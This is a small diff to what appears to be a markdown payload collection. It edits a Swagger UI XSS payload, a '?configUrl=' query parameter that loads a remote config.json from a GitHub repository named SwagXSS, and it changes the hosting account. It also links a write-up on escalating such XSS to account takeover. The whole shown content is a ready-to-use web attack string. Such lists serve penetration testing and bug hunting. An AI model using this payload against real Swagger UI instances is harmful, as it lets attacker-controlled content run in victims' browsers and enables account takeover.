@@ -4,6 +4,6 @@
   
 ### `configUrl Payload`
 
-`?configUrl=https://raw.githubusercontent.com/0xManan/SwagXSS/main/config.json`
+`?configUrl=https://raw.githubusercontent.com/0x2458bughunt/SwagXSS/main/config.json`
 
 **More info at**: https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
